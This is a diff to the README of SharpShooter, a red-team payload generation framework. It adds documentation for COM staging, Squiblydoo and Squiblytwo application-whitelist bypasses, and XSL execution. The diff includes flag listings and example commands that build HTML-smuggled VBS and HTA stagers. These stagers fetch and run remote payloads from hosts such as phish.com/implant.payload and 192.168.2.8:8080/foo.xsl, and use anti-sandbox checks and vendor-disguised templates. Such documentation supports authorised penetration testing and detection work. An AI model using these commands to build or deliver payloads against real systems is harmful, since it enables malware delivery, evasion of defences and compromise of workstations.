@@ -22,7 +22,9 @@ Finally, SharpShooter provides the ability to bundle the payload inside an HTML 
 
 SharpShooter targets v2, v3 and v4 of the .NET framework which will be found on most end-user Windows workstations.
 
-Further information can be found on the MDSec blog post.
+Version 1.0 of SharpShooter introduced several new concepts, including COM staging, execution of Squiblydoo and Squiblytwo, as well as XSL execution. To acomplish this new functionality, several new flags were added; --com, --awl and --awlurl.
+
+Further information can be found on the [MDSec blog post](https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/).
 
 Usage - Interactive Mode:
 ======
@@ -117,6 +119,7 @@ Running SharpShooter with the --help argument will produce the following output:
 
 ```
 usage: SharpShooter.py [-h] [--interactive] [--stageless] [--dotnetver <ver>]
+                       [--com <com>] [--awl <awl>] [--awlurl <awlurl>]
                        [--payload <format>] [--sandbox <types>]
                        [--delivery <type>] [--rawscfile <path>] [--shellcode]
                        [--scfile <path>] [--refs <refs>] [--namespace <ns>]
@@ -128,8 +131,11 @@ optional arguments:
   --interactive       Use the interactive menu
   --stageless         Create a stageless payload
   --dotnetver <ver>   Target .NET Version: 2 or 4
+  --com <com>         COM Staging Technique: outlook, shellbrowserwin, wmi, wscript, xslremote
+  --awl <awl>         Application Whitelist Bypass Technique: wmic, regsvr32
+  --awlurl <awlurl>   URL to retrieve XSL/SCT payload
   --payload <format>  Payload type: hta, js, jse, vba, vbe, vbs, wsf
-  --sandbox <types>   Anti-sandbox techniques:
+  --sandbox <types>   Anti-sandbox techniques: 
                       [1] Key to Domain (e.g. 1=CONTOSO)
                       [2] Ensure Domain Joined
                       [3] Check for Sandbox Artifacts
@@ -150,7 +156,7 @@ optional arguments:
   --output <output>   Name of output file (e.g. maldoc)
   --smuggle           Smuggle file inside HTML
   --template <tpl>    Name of template file (e.g. mcafee)
-  ```
+```
 
 Examples of some use cases are provided below:
 
@@ -186,7 +192,23 @@ This example creates a staged VBS payload that performs both Web and DNS deliver
 SharpShooter.py --dotnetver 2 --payload js --sandbox 2,3,4,5 --delivery web --refs mscorlib.dll,System.Windows.Forms.dll --namespace MDSec.SharpShooter --entrypoint Main --web http://www.phish.com/implant.payload --output malicious --smuggle --template mcafee
 ```
 
-This example demonstrates how to create a staged JS payload that performs web delivery, retrieving a payload from http://www.phish.com/implant.payload. The generated payload will attempt sandbox evasion, and attempt to compile the retrieved payload which requires mscorlib.dll and System.Windows.Forms.dll as DLL references. The Main method in the MDSec.SharpShooter namespace will be executed on successful compilation. 
+This example demonstrates how to create a staged JS payload that performs web delivery, retrieving a payload from http://www.phish.com/implant.payload. The generated payload will attempt sandbox evasion, and attempt to compile the retrieved payload which requires mscorlib.dll and System.Windows.Forms.dll as DLL references. The Main method in the MDSec.SharpShooter namespace will be executed on successful compilation.
+
+### Creation of a Squiblytwo VBS ###
+
+```
+SharpShooter.py --stageless --dotnetver 2 --payload vbs --output foo --rawscfile ./x86payload.bin --smuggle --template mcafee --com outlook --awlurl http://192.168.2.8:8080/foo.xsl
+```
+
+This example creates a VBS smuggled COM stager that uses the Outlook.CreateObject() COM method as a primitive to execute wmic.exe to execute a hosted stylesheet. The --awl parameter is not used by defaults to wmic.
+
+### Creation of a XSL HTA ###
+
+```
+SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./x86payload.bin --smuggle --template mcafee --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl
+```
+
+This example creates a HTA smuggled file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet.
 
 Author and Credits
 ==================
@@ -197,3 +219,4 @@ Credits:
 - [@Arno0x0x](https://twitter.com/Arno0x0x): for EmbedInHTML
 - [@buffaloverflow](https://twitter.com/buffaloverflow): Rich Warren for Demiguise
 - [@arvanaghi](https://twitter.com/arvanaghi) and [@ChrisTruncer](https://twitter.com/ChrisTruncer): Brandon Arvanaghi and Chris Truncer for CheckPlease
+- [@subTee](https://twitter.com/subtee): Documentation for Squiblydoo and Squiblytwo techniques
